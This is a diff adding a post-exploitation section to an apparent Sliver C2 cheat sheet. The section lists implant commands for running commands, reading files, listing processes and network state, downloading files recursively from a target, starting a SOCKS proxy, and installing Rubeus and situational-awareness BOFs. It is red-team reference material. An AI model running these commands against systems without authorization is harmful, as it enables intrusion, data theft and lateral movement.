@@ -171,6 +171,50 @@ Sliver can easily create debugging payloads for testing execution or viewing C2 
 parameter when generating new payloads which will show the debug output in the CLI console. 
 
 --------------------------------------------------------------
+## Post-Exploitation (Built-in Commands)
+
+Show active Beacons/Sessions with the `beacons` or `sessions` command. Next, interact with a Beacon/Session by typing `use <ID>`
+```
+info --> List info of current implant
+getpid --> List current process PID
+whoami --> List current user
+
+# Execute commands on system
+execute somecommand args1 args2
+
+# Reconfiguring sleep/jitter time
+reconfig -i 10s -j 25s
+
+# Files
+ls /home/kali --> LS, accepts wildcards
+ls C:\\temp\\ --> LS, accepts wildcards
+cat /path/to/read/file.txt --> Cat a file
+mkdir C:\\temp\\payloads --> Make new directory
+
+# Processes
+ps --> List processes
+ps -o admin --> Filter processes based on owner
+ps -p <PID> --> Filter process based on PID
+
+netstat --> List network connections
+ifconfig --> List IP addresses
+
+# Upload/download
+upload C:\path\to\file.exe C:\\users\\admin\\downloads\\file.exe --> Upload file to target
+download C:\\windows\\temp\\file.txt --> Download file to current local directory
+download C:\\windows\\temp\\file.txt C:\path\to\save\file.txt --> Download file to specific local path
+download C:\\users\admin\\downloads\\ -r --> Recursively download all files to current local directory
+
+# SOCKS
+socks5 start
+socks5 stop
+
+# View tasked commands
+tasks
+tasks fetch <ID> # fetch output from past task
+```
+
+--------------------------------------------------------------
 ## BOFs
 ### Sliver Armory
 
@@ -186,6 +230,8 @@ armory update
 # Installations
 armory install all --> Installing everything
 armory install rubeus --> Install just Rubeus
+armory install situational-awareness --> Install Situational Awareness package
+armory search sa --> Search for Situational Awareness BOFs
 ```
 
 ### Custom BOFs
